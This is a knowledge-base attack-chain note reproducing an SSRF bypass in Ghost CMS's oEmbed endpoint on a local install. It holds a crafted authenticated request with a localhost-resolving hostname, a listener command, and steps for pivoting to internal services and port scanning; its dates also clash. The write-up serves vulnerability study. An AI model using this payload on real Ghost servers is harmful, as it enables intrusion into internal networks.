---
tags:
  - ssrf
  - ghost-cms
  - node.js
  - web-vulnerability
  - hostname-spoofing
type: attack_chain
tools:
  - '[[tools/ghost-cli]]'
  - '[[tools/Burp-Suite]]'
  - '[[tools/Python-SimpleHTTPServer]]'
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
commands:
  - '[[commands/npm-install-ghost-cli]]'
  - '[[commands/ghost-install-local]]'
  - '[[commands/ghost-stop]]'
  - '[[commands/sudo-python-simplehttpserver]]'
  - '[[commands/get-oembed-ssrf-request]]'
platforms:
  - Web
  - Node.js
complexity: medium
procedures:
  - '[[procedures/Install-Ghost-CLI-Globally]]'
  - '[[procedures/Install-and-Setup-Ghost-Locally]]'
  - '[[procedures/Authenticate-as-Ghost-Administrator]]'
  - '[[procedures/Send-Crafted-oEmbed-Request-for-SSRF]]'
  - '[[procedures/Start-Local-HTTP-Server-to-Capture-SSRF]]'
step_count: 6
techniques:
  - '[[Exploit Public-Facing Application]]'
description: >-
  An authenticated publisher exploits a SSRF vulnerability in Ghost CMS by
  crafting an oEmbed request with a spoofed hostname that resolves to localhost,
  allowing arbitrary internal network access.
skill_level: intermediate
impact_level: high
id: 49116e02-81f1-4d76-8730-f8327d79f131
created_at: '2025-12-14T04:39:09.678Z'
updated_at: '2025-12-14T04:39:09.678Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# SSRF Bypass in Ghost CMS oEmbed Endpoint Using Hostname Spoofing

Multi-stage attack chain demonstrating exploitation of SSRF in Ghost CMS via the oEmbed endpoint, where hostname validation fails to resolve domains, allowing internal network access.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 6 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Environment] --> B[Authenticate] --> C[Exploit oEmbed Endpoint]
    C --> D[Capture Internal Request]
    D --> E[Access Internal Services]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/ghost-cli]]
- [[tools/Burp-Suite]]
- [[tools/Python-SimpleHTTPServer]]

### Target Environment

- Ghost CMS version vulnerable to SSRF (pre-fix for hostname resolution in fetchOembedData())
- Node.js runtime
- Local development setup with ports 80 and 2368 (default Ghost admin)

### Initial Access Requirements

- Local machine with npm and Python installed
- No prior credentials needed; admin registration during setup
- Network access to localhost for capturing requests

## Detailed Attack Procedures

### Step 1: Install Ghost CLI Globally
procedure: [[procedures/Install-Ghost-CLI-Globally]]

**Objective**: Install the command-line tool required to manage and set up Ghost instances locally.

**Instructions**: Execute [[commands/npm-install-ghost-cli]] to install the latest Ghost CLI globally via npm.

```bash
npm install ghost-cli@latest -g
```

**Expected Output**: Installation logs confirming successful global installation of ghost-cli.

**Success Indicators**:
- `ghost` command available in terminal
- No errors in npm output

### Step 2: Install and Setup Ghost Locally
procedure: [[procedures/Install-and-Setup-Ghost-Locally]]

**Objective**: Deploy a local Ghost instance to replicate the vulnerable environment.

**Instructions**: Run [[commands/ghost-install-local]] to set up Ghost in local mode, which initializes the database and starts the server.

```bash
ghost install local
```

Follow prompts to configure database (SQLite by default) and URL (http://localhost:2368).

If needed, use [[commands/ghost-stop]] to restart:

```bash
ghost stop
```

**Expected Output**: Ghost server starts on port 2368 with admin setup URL provided.

**Success Indicators**:
- Ghost accessible at http://localhost:2368
- Admin panel ready for registration

### Step 3: Authenticate as Ghost Administrator
procedure: [[procedures/Authenticate-as-Ghost-Administrator]]

**Objective**: Gain authenticated access with publisher privileges to interact with the oEmbed endpoint.

**Instructions**: Access the Ghost admin portal at http://localhost:2368/ghost and register the first user account, which automatically receives administrator privileges. Log in to obtain session cookies.

**Expected Output**: Successful login to Ghost admin dashboard.

**Success Indicators**:
- Admin dashboard accessible
- Session cookies captured for subsequent requests

### Step 4: Send Crafted oEmbed Request for SSRF
procedure: [[procedures/Send-Crafted-oEmbed-Request-for-SSRF]]

**Objective**: Exploit the SSRF by sending a GET request to the oEmbed endpoint with a spoofed hostname that resolves to localhost.

**Instructions**: Using an authenticated session in [[tools/Burp-Suite]], send [[commands/get-oembed-ssrf-request]] to the endpoint.

```bash
GET /ghost/api/v3/admin/oembed/?url=http://spoofed.burpcollaborator.net/index.html&type=embed HTTP/1.1
Host: localhost:2368
Cookie: ghost-admin-api-session=your-session-cookie
```

Replace the URL with a domain like localtest.me or spoofed.burpcollaborator.net that resolves to 127.0.0.1 but passes regex checks.

**Expected Output**: oEmbed response from Ghost, but triggers internal fetch to localhost.

**Success Indicators**:
- No validation error from Ghost
- Incoming request observed on local listener (Step 5)

### Step 5: Start Local HTTP Server to Capture SSRF
procedure: [[procedures/Start-Local-HTTP-Server-to-Capture-SSRF]]

**Objective**: Listen for the SSRF-induced request to localhost, confirming arbitrary internal access.

**Instructions**: Before sending the oEmbed request, start a local server using [[commands/sudo-python-simplehttpserver]] on port 80.

```bash
sudo python -m SimpleHTTPServer 80
```

**Expected Output**: Server logs showing incoming GET request from Ghost to /index.html on localhost:80.

**Success Indicators**:
- Request captured, proving SSRF success
- Ability to pivot to other internal ports/services

### Step 6: Validate and Escalate Impact

**Objective**: Confirm SSRF allows access to internal networks and assess further exploitation.

**Instructions**: Analyze captured request logs. Modify the oEmbed URL to target internal services (e.g., http://127.0.0.1:internal-port) using similar spoofed domains.

**Expected Output**: Responses from internal services fetched via Ghost.

**Success Indicators**:
- Internal metadata or service responses exfiltrated
- Potential for further attacks like port scanning

## Attack Chain Summary

### Key Achievements

1. Bypassed SSRF protections in Ghost's fetchOembedData() by exploiting unresolve hostname validation
2. Demonstrated arbitrary internal GET requests as an authenticated publisher
3. Captured proof-of-concept SSRF traffic to localhost

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Discovery]]

---
*Last updated: 2023-10-01T00:00:00Z*
